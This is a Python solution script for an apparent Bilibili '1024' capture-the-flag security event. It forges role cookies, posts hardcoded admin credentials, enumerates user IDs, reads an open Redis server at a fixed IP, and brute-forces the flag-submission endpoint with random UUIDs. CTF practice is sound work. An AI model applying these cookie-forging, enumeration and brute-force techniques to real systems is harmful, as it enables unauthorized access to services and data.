import requests
import json
import redis
import uuid
import threading
import random
def func8():
    r=redis.Redis(host="120.92.151.189",port=6379,decode_responses=True)
    for i in range(1):#range(1,11)
        q="flag"+str(8)
        try:
            print("flag8:",r.get(q))
        except:print("falut")
sessionMy='session='+""#你的bilibili 1024的session
bilibiliCookie=""#在提交页面的/flag的cookie
class Lucky(Exception):
    pass
def func1(session,isPush):
    url1='http://45.113.201.36/api/admin'
    head1={"User-Agent":"bilibili Security Browser",
    'Cookie':session}
    req1=requests.get(url1,headers=head1)
    print("flag1:"+req1.text)
    if(isPush):
        return push(1,json.loads(req1.text)["flag"],bilibiliCookie)
def func2(session,isPush):
    url2="http://45.113.201.36/api/ctf/2"
    head2={"User-Agent":"bilibili Security Browser",
    'Cookie':session}
    req2=requests.get(url2,headers=head2)
    print("flag2:",req2.text)
    if(isPush):
        return push(2,json.loads(req2.text)["flag"],bilibiliCookie)
def func3(session,isPush):
    url3="http://45.113.201.36/api/ctf/3"
    head3={"User-Agent":"bilibili Security Browser",
    'Cookie':'role=ee11cbb19052e40b07aac0ca060c23ee; '+session}
    req3=requests.post(url3,data='{username: "admin", passwd: "bilibili"}',headers=head3)
    print("flag3:",req3.text)
    if(isPush):
        return push(3,json.loads(req3.text)["flag"],bilibiliCookie)
def func4(session,isPush):
    url4="http://45.113.201.36/api/ctf/4"
    head4={"User-Agent":"bilibili Security Browser",
    'Cookie':session+'; role=7b7bc2512ee1fedcd76bdc68926d4f7b'}
    req4=requests.get(url4,headers=head4)
    print('flag4:',req4.text)
    if(isPush):
        return push(4,json.loads(req4.text)["flag"],bilibiliCookie)
def func5(session,isPush,tryNum,result):
    url5="http://45.113.201.36/api/ctf/5?uid=%s"
    int5=100336889
    head5={"User-Agent":"bilibili Security Browser",
    'Cookie':'role=ee11cbb19052e40b07aac0ca060c23ee; '+session}
    for i in range(tryNum):#range(1000)
        if(tryNum==1): req5=requests.get(url5%(result+int5),headers=head5)
        else: req5=requests.get(url5%(i+int5),headers=head5)
        if(json.loads(req5.text)["code"]=="200"):print(url5%(i+int5))
        print("flag5:",req5.text)
def always(session):
    H = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'
    ii=4432
    while True:
        t=""
        for s in range(8):t+=random.choice(H)
        flag=uuid.uuid5(uuid.NAMESPACE_DNS,t)
        for i in [6,7,9]:
            ii+=1
            p=push(i,str(flag),bilibiliCookie)
            if(p=="Flag错误，请继续努力"):
                print(p)
                print(str(flag)+" "+str(ii))
            else:
                print("##################################33")
                print(p)
                print("#####################################")
                raise Lucky()
def push(ctf_id,flag,biliCookie):
    urlpush="https://security.bilibili.com/sec1024/api/v1/flag"
    headpush={'cookie': biliCookie,
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36 Edg/86.0.622.51'}
    reqt=requests.post(urlpush,data='{\"flag\": \"%s\", \"ctf_id\": %s}'%(str(flag),ctf_id),headers=headpush)
    if(json.loads(reqt.text)["msg"]=="Flag错误，请继续努力"):
        return "Flag错误，请继续努力"
    else:
        return str(ctf_id)+str(flag)
if __name__ == "__main__":
    func1(sessionMy,False)
    func2(sessionMy,False)
    func3(sessionMy,False)
    func4(sessionMy,False)
    func5(sessionMy,False,1,81)
    func8()
    always(sessionMy)